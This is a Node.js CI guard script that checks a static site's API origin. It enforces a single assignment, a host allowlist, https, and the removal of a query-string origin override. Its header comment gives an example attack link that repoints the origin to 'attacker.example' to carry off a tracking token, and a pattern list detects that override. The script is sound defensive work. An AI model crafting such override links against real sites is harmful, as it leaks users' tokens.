#!/usr/bin/env node
/**
 * Guard: the site's API origin is one value, written once per file, and expected.
 *
 * Why three copies exist
 * ----------------------
 * invite/invite.js, invite/redeem.js and track/track.js each declare their own
 * `API_BASE`. They are deliberately not collapsed into a shared
 * `window.SERAYAE_API_BASE`, but NOT for the security reason an earlier version
 * of this comment gave. That reason was wrong and review said so: any script
 * able to execute on /invite or /track already owns the page — it can replace
 * `window.fetch`, read the OTP field, or read the bearer token straight out of
 * the verify-otp response. Hiding the string in a closure buys nothing against
 * XSS.
 *
 * The `?api=` override deleted in #7 was a different threat in kind: it was
 * attacker-controllable through a *link*, with no script execution at all. Send
 * a guardian `/track/?t=<token>&api=https://attacker.example` and the tracking
 * token leaves in the request path. That is why an origin must never again be
 * writable from page input — and it is why this script's real job is rule 2
 * below, not the existence of three literals.
 *
 * The literals stay for plain engineering reasons: a shared config.js adds a
 * script-order failure mode on pages where a broken base means a guardian
 * watching an emergency sees nothing, in exchange for deduplicating three
 * strings on a static site. Cheaper to check than to centralise.
 *
 * What it enforces
 * ----------------
 *  1. Each file declares the origin exactly once, and that declaration is real
 *     code, not a commented-out line.
 *  2. The identifier is ASSIGNED exactly once in the whole file. This is the
 *     rule that matters: the #7 bug was `if (override) apiBase = override;` —
 *     a reassignment, not a declaration. A declaration-only check waved it
 *     through, which is what review demonstrated on the first version of this
 *     script.
 *  3. No `?api=`-style origin override is reintroduced.
 *  4. All origins are byte-identical across the three files.
 *  5. The host is on a positive allowlist. A blocklist of dead hosts cannot
 *     catch a mistyped redeploy of an unmemorable Heroku suffix.
 *  6. https, no port, path exactly `/api` (compared with no normalisation, so a
 *     trailing slash fails — `/api/` + `/referrals/redeem` yields `//` and 404s
 *     every request), no query, no fragment.
 *
 * Usage
 *   node .github/scripts/check-api-origin.js             # verify
 *   node .github/scripts/check-api-origin.js --print     # print origin on the last line
 *
 * Exits non-zero with a specific message on any violation.
 */

'use strict';

const fs = require('fs');
const path = require('path');

const REPO_ROOT = path.resolve(__dirname, '..', '..');

/** Every file that holds an API origin, and the identifier holding it. */
const TARGETS = [
  { file: 'invite/invite.js', varName: 'API_BASE' },
  { file: 'invite/redeem.js', varName: 'API_BASE' },
  { file: 'track/track.js', varName: 'API_BASE' },
];

/**
 * The only hosts this site may talk to.
 *
 * Add `api.serayae.me` here in the SAME commit that repoints the three files to
 * it, so the two can never disagree. Do not add a staging host: use a local
 * build instead, which is the rule #7 established.
 */
const ALLOWED_HOSTS = [
  'serayae-api-01118af29270.herokuapp.com', // Heroku app `serayae-api`, EU region
  'api.serayae.me', // reserved for the custom-domain cutover
];

/** Patterns that must not reappear anywhere in these files. */
const FORBIDDEN_PATTERNS = [
  {
    pattern: /[?&]api=/,
    reason:
      'a `?api=` origin override is the token-exfiltration primitive removed in #7 — ' +
      'a crafted link could repoint the origin with no script execution at all.',
  },
  {
    pattern: /\bsearchParams\.get\(\s*['"]api['"]\s*\)/,
    reason: 'reading an `api` query parameter reintroduces the #7 override.',
  },
];

const errors = [];
const found = [];

/**
 * Blank out comments so a commented-out declaration is neither accepted as real
 * code nor counted as a duplicate.
 *
 * Line comments are stripped only when the line's first non-whitespace
 * characters are `//`, `*` or `/*`. A naive strip-from-`//` would destroy every
 * `https://` in the file, and a full tokeniser is not worth a dependency on a
 * static site. Trailing comments after code are therefore left alone; that is
 * acceptable because rules 1 and 2 count assignments, and a trailing comment
 * cannot contain one that executes.
 */
function stripCommentLines(source) {
  let inBlock = false;
  return source
    .split('\n')
    .map((line) => {
      const trimmed = line.trim();

      if (inBlock) {
        if (trimmed.includes('*/')) inBlock = false;
        return '';
      }
      if (trimmed.startsWith('/*')) {
        if (!trimmed.includes('*/')) inBlock = true;
        return '';
      }
      if (trimmed.startsWith('//') || trimmed.startsWith('*')) return '';

      return line;
    })
    .join('\n');
}

for (const { file, varName } of TARGETS) {
  const abs = path.join(REPO_ROOT, file);

  if (!fs.existsSync(abs)) {
    errors.push(`${file}: file is missing — the guard cannot verify an origin that is not there.`);
    continue;
  }

  const raw = fs.readFileSync(abs, 'utf8');
  const code = stripCommentLines(raw);

  // ── rule 1: exactly one real declaration ────────────────────────────────
  const declRe = new RegExp(
    `\\b(?:var|let|const)\\s+${varName}\\s*=\\s*(['"])([^'"]+)\\1\\s*;`,
    'g',
  );
  const decls = [...code.matchAll(declRe)];

  if (decls.length === 0) {
    errors.push(
      `${file}: no executable \`var ${varName} = '<origin>';\` declaration found. ` +
        `A declaration that is commented out does not count — the page would throw ` +
        `a ReferenceError under 'use strict'. If the variable was renamed, update ` +
        `TARGETS in this script.`,
    );
    continue;
  }
  if (decls.length > 1) {
    errors.push(
      `${file}: ${decls.length} declarations of \`${varName}\`. Exactly one is required.`,
    );
    continue;
  }

  // ── rule 2: exactly one ASSIGNMENT anywhere (the #7 shape) ──────────────
  //
  // Matches plain `NAME =` AND every compound assignment (`+=`, `&&=`, `>>=`,
  // `??=` …), while excluding the comparisons `==`, `===`, `!=`, `!==`, `>=`
  // and `<=`.
  //
  // Two notes, both learned by testing rather than reasoning:
  //
  //   * An earlier version used a lookbehind after `\s*` to reject operators.
  //     It was dead code: with `\s*` already consumed, the character before the
  //     `=` is either whitespace or the last letter of the identifier, so the
  //     lookbehind could never fire. Worse, it gave the false impression that
  //     `+=` was handled — it was not, and `API_BASE += '/v2'` passed.
  //   * Multi-character operators must precede single ones in the alternation,
  //     and `>>>` must precede `>>`, or the longer form never matches.
  //
  // Known and accepted false positive: the literal text `API_BASE =` inside a
  // string or a trailing comment counts as an assignment. That fails closed —
  // it reports a problem that is not there rather than missing one that is —
  // and no such string exists in these files.
  const ASSIGN_OPS = '\\*\\*|<<|>>>|>>|&&|\\|\\||\\?\\?|[+\\-*/%&|^]';
  const assignRe = new RegExp(`\\b${varName}\\s*(?:${ASSIGN_OPS})?=(?!=)`, 'g');
  const assigns = [...code.matchAll(assignRe)];

  if (assigns.length !== 1) {
    const lines = assigns.map((m) => code.slice(0, m.index).split('\n').length);
    errors.push(
      `${file}: \`${varName}\` is assigned ${assigns.length} times (lines ${lines.join(', ')}), ` +
        `expected exactly 1.\n    The #7 bug was a REASSIGNMENT — \`if (override) apiBase = override;\` — ` +
        `not a second declaration. The origin must be written once and never again, or a ` +
        `crafted link can repoint it and carry the token away.`,
    );
    continue;
  }

  // ── rule 3: no override mechanism anywhere in the file ──────────────────
  for (const { pattern, reason } of FORBIDDEN_PATTERNS) {
    if (pattern.test(code)) {
      errors.push(`${file}: matches ${pattern} — ${reason}`);
    }
  }

  found.push({ file, varName, value: decls[0][2] });
}

// ── rules 5 and 6: the value itself ────────────────────────────────────────
for (const { file, value } of found) {
  let url;
  try {
    url = new URL(value);
  } catch {
    errors.push(
      `${file}: '${value}' is not a parsable absolute URL. The origin must be a ` +
        `literal string, not a concatenation or template.`,
    );
    continue;
  }

  if (url.protocol !== 'https:') {
    errors.push(
      `${file}: scheme is '${url.protocol}' — must be https. These pages carry ` +
        `bearer and tracking tokens.`,
    );
  }

  if (!ALLOWED_HOSTS.includes(url.hostname)) {
    errors.push(
      `${file}: host '${url.hostname}' is not allowed.\n    Permitted: ${ALLOWED_HOSTS.join(', ')}\n` +
        `    An allowlist is used deliberately: the live host carries an unmemorable ` +
        `random suffix, and a single mistyped character would otherwise pass every ` +
        `other rule while breaking every invite and tracking link on the site.`,
    );
  }

  if (url.port !== '') {
    errors.push(`${file}: origin must not specify a port (got ':${url.port}').`);
  }

  // Compared with NO normalisation on purpose: '/api/' would build
  // '/api//referrals/redeem', which Express does not match.
  if (url.pathname !== '/api') {
    errors.push(
      `${file}: path is '${url.pathname}' — must be exactly '/api' with no trailing ` +
        `slash, because every call site appends a route like '/referrals/redeem'.`,
    );
  }

  if (url.search !== '' || url.hash !== '') {
    errors.push(`${file}: origin must carry no query string or fragment (got '${value}').`);
  }
}

// ── rule 4: the three agree ────────────────────────────────────────────────
if (found.length === TARGETS.length) {
  const distinct = [...new Set(found.map((f) => f.value))];
  if (distinct.length > 1) {
    errors.push(
      'the origins disagree:\n' +
        found.map((f) => `      ${f.file.padEnd(18)} ${f.value}`).join('\n') +
        '\n    All must be byte-identical. An invite is minted against one page and ' +
        'redeemed on another; pointing them at different backends makes an invite ' +
        'silently impossible to accept.',
    );
  }
}

// ── report ─────────────────────────────────────────────────────────────────
if (errors.length > 0) {
  console.error('✗ API origin check failed:\n');
  for (const e of errors) console.error(`  • ${e}\n`);
  process.exit(1);
}

const origin = found[0].value;
console.error(`✓ API origin check passed — all ${found.length} files agree on ${origin}`);

if (process.argv.includes('--print')) {
  // stdout carries ONLY the origin, so a caller can capture it without `tail`.
  process.stdout.write(`${origin}\n`);
}
